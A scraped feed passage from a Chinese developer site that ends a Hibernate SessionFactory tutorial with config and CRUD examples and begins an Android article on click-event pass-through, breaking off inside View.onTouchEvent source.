img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>SessionFactory</code>是Hibernate的核心组件之一，它负责创建和管理Session对象。<code>SessionFactory</code>是一个线程安全（thread-safe）的对象，通常在应用程序初始化时创建，并在整个应用程序运行期间存在。每个数据库需要一个唯一的<code>SessionFactory</code>实例，它充当连接数据库的工厂。</p>
<h3 data-id="heading-0">主要功能</h3>
<ol>
<li><strong>创建Session</strong>：负责创建新的<code>Session</code>对象。</li>
<li><strong>管理Session</strong>：管理已经创建的<code>Session</code>对象。</li>
<li><strong>缓存配置</strong>：为<code>Session</code>提供二级缓存支持。</li>
<li><strong>数据库连接管理</strong>：管理与数据库的连接。</li>
<li><strong>性能优化</strong>：通过缓存和连接池技术提高性能。</li>
</ol>
<h3 data-id="heading-1">创建SessionFactory</h3>
<p>通常，<code>SessionFactory</code>由配置文件（如<code>hibernate.cfg.xml</code>）配置，并在应用程序启动时通过<code>Configuration</code>对象创建。</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code> 示例</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">使用SessionFactory</h3>
<p>通过<code>Configuration</code>对象读取配置文件并创建<code>SessionFactory</code>实例：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从配置文件创建SessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h3 data-id="heading-4">使用Session进行操作</h3>
<p>以下是一个完整的例子，展示如何使用<code>SessionFactory</code>创建<code>Session</code>并进行CRUD操作：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        <span class="hljs-comment">// 打开一个新的Session</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();

        <span class="hljs-comment">// 启动事务</span>
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();

        <span class="hljs-comment">// 创建并保存Student对象</span>
        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
        session.save(student); <span class="hljs-comment">// 保存对象</span>

        <span class="hljs-comment">// 提交事务</span>
        transaction.commit();

        <span class="hljs-comment">// 重新开始一个新的事务</span>
        transaction = session.beginTransaction();

        <span class="hljs-comment">// 读取Student对象</span>
        <span class="hljs-type">Student</span> <span class="hljs-variable">retrievedStudent</span> <span class="hljs-operator">=</span> session.get(Student.class, student.getId());
        System.out.println(<span class="hljs-string">"Retrieved Student: "</span> + retrievedStudent.getName() + <span class="hljs-string">", Age: "</span> + retrievedStudent.getAge());

        <span class="hljs-comment">// 更新Student对象</span>
        retrievedStudent.setAge(<span class="hljs-number">21</span>);
        session.update(retrievedStudent); <span class="hljs-comment">// 更新对象</span>

        <span class="hljs-comment">// 删除Student对象</span>
        session.delete(retrievedStudent); <span class="hljs-comment">// 删除对象</span>

        <span class="hljs-comment">// 提交事务</span>
        transaction.commit();

        <span class="hljs-comment">// 关闭Session</span>
        session.close();
        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h3 data-id="heading-5">详细解释</h3>
<ol>
<li><strong>配置SessionFactory</strong>：在<code>HibernateUtil</code>类中，通过<code>Configuration</code>对象读取<code>hibernate.cfg.xml</code>配置文件，创建<code>SessionFactory</code>实例。这个过程通常在应用程序启动时执行，并且<code>SessionFactory</code>在整个应用程序的生命周期中是单例的。</li>
<li><strong>获取Session</strong>：通过<code>SessionFactory.openSession()</code>方法获取新的<code>Session</code>对象。<code>Session</code>对象用于执行CRUD操作。</li>
<li><strong>启动事务</strong>：通过<code>session.beginTransaction()</code>方法启动事务。</li>
<li><strong>CRUD操作</strong>：
<ul>
<li><strong>创建并保存对象</strong>：使用<code>session.save(student)</code>方法将对象持久化到数据库中。</li>
<li><strong>读取对象</strong>：使用<code>session.get(Student.class, student.getId())</code>方法从数据库中读取对象。</li>
<li><strong>更新对象</strong>：修改对象属性后，使用<code>session.update(retrievedStudent)</code>方法更新数据库中的记录。</li>
<li><strong>删除对象</strong>：使用<code>session.delete(retrievedStudent)</code>方法从数据库中删除对象。</li>
</ul>
</li>
<li><strong>提交事务</strong>：通过<code>transaction.commit()</code>方法提交事务，将所有更改同步到数据库。</li>
<li><strong>关闭Session</strong>：通过<code>session.close()</code>方法关闭<code>Session</code>。</li>
<li><strong>关闭SessionFactory</strong>：通过<code>sessionFactory.close()</code>方法关闭<code>SessionFactory</code>。</li>
</ol>
<h3 data-id="heading-6">性能优化</h3>
<p><code>SessionFactory</code>还提供一些性能优化功能，例如：</p>
<ul>
<li><strong>二级缓存</strong>：通过配置二级缓存，减少对数据库的直接访问，提高性能。</li>
<li><strong>连接池管理</strong>：通过配置连接池，管理和优化数据库连接的使用。</li>
</ul>
<h4 data-id="heading-7">二级缓存配置示例</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 二级缓存配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.cache.use_second_level_cache"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.cache.region.factory_class"</span>&gt;</span>org.hibernate.cache.ehcache.EhCacheRegionFactory<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.cache.provider_class"</span>&gt;</span>org.hibernate.cache.EhCacheProvider<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<p>通过上述配置，启用Hibernate的二级缓存机制，可以显著提高应用程序性能。</p>
<h3 data-id="heading-8">总结</h3>
<p><code>SessionFactory</code>是Hibernate的核心组件之一，负责创建和管理<code>Session</code>对象，提供了数据库连接、缓存管理和性能优化等功能。在一个典型的Hibernate应用程序中，<code>SessionFactory</code>通常在应用程序启动时初始化，并在整个应用程序生命周期中使用。正确地使用<code>SessionFactory</code>和<code>Session</code>，可以有效地进行数据库操作，提高应用程序的性能和稳定性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 事件分发机制（二）—— 点击事件透传]]></title>    <link>https://juejin.cn/post/7588139768276647987</link>    <guid>https://juejin.cn/post/7588139768276647987</guid>    <pubDate>2025-12-28T14:02:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588139768276647987" data-draft-id="7588084804093526054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 事件分发机制（二）—— 点击事件透传"/> <meta itemprop="keywords" content="Android,源码,面试"/> <meta itemprop="datePublished" content="2025-12-28T14:02:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="无限进化"/> <meta itemprop="url" content="https://juejin.cn/user/108212996024855"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 事件分发机制（二）—— 点击事件透传
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/108212996024855/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    无限进化
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T14:02:38.000Z" title="Sun Dec 28 2025 14:02:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    22
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 点击透传逻辑</h2>
<p>Android 事件分发遵循 Activity -&gt; Window -&gt; ViewGroup -&gt; View 的链路，透传的关键在于 <strong>ViewGroup 如何分发事件给子 View</strong>。</p>
<p>在 <code>ViewGroup.dispatchTouchEvent</code> 中，处理 <code>ACTION_DOWN</code> 时会遍历子 View 寻找消费者，透传的本质就是控制这个遍历过程。</p>
<p>要实现透传，必须让上层 View 在 <code>dispatchTransformedTouchEvent</code> 中返回 <code>false</code>，或者在第一步就被判定为 <code>continue</code> 跳过。</p>
<p><a href="https://juejin.cn/post/7588109656041259054" target="_blank" title="https://juejin.cn/post/7588109656041259054">点击阅读：Android 事件分发机制（一）—— 全流程源码解析</a></p>
<h2 data-id="heading-1">2. 点击透传的实现</h2>
<h3 data-id="heading-2">2.1 属性控制</h3>
<p>通过属性设置上层 View 不可点击。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span>
    <span class="hljs-attr">android:clickable</span>=<span class="hljs-string">"false"</span>
    <span class="hljs-attr">android:focusable</span>=<span class="hljs-string">"false"</span> /&gt;</span>
</code></pre>
<h4 data-id="heading-3">源码原理</h4>
<p><code>View.onTouchEvent</code> 默认实现中，只有当 View 是 <code>CLICKABLE</code> 或 <code>LONG_CLICKABLE</code> 等状态时才会返回 <code>true</code>。如果设为 false，<code>onTouchEvent</code> 返回 <code>false</code>，ViewGroup 的循环会继续找下一个子 View（即下层 View）。而 focusable="false" 则是为了防止非触摸模式下的焦点抢占和无障碍干扰。</p>
<p>注：给 View 设置 setOnClickListener 时会直接 setClickable(true)。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onTouchEvent</span><span class="hljs-params">(MotionEvent event)</span> {
    <span class="hljs-comment">// 是否“可点击” (clickable)</span>
    <span class="hljs-comment">// 只要满足 CLICKABLE、LONG_CLICKABLE、CONTEXT_CLICKABLE 任意一个，即视为可点击。</span>
    <span class="hljs-comment">// 注意：focusable 属性不参与这个 clickable 变量的计算</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">clickable</span> <span class="hljs-operator">=</span> ((viewFlags &amp; CLICKABLE) == CLICKABLE
            || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)
            || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE;

    <span class="hljs-comment">// ... </span>
    <span class="hljs-comment">// 只有当 View 是 clickable 的（或有 Tooltip），才会进入此块。</span>
    <span class="hljs-keyword">if</span> (clickable || (viewFlags &amp; TOOLTIP) == TOOLTIP) {
        <span class="hljs-keyword">switch</span> (action) {
            <span class="hljs-keyword">case</span> MotionEvent.ACTION_UP:
                <span class="hljs-comment">// ... </span>
                <span class="hljs-comment">// 处理 Focusable 逻辑 (仅在 View 已经消费事件的前提下)</span>
                <span class="hljs-type">boolean</span> <span class="hljs-variable">focusTaken</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
                <span class="hljs-comment">// 点击会获取焦点？</span>
                <span class="hljs-comment">// 条件：View 是 focusable 的 + 在 Touch 模式下允许 focus + 当前没焦点</span>
                <span class="hljs-keyword">if</span> (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) {
                    focusTaken = requestFocus(); 
                }

                <span class="hljs-comment">// 执行点击回调</span>
                <span class="hljs-keyword">if</span> (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) {
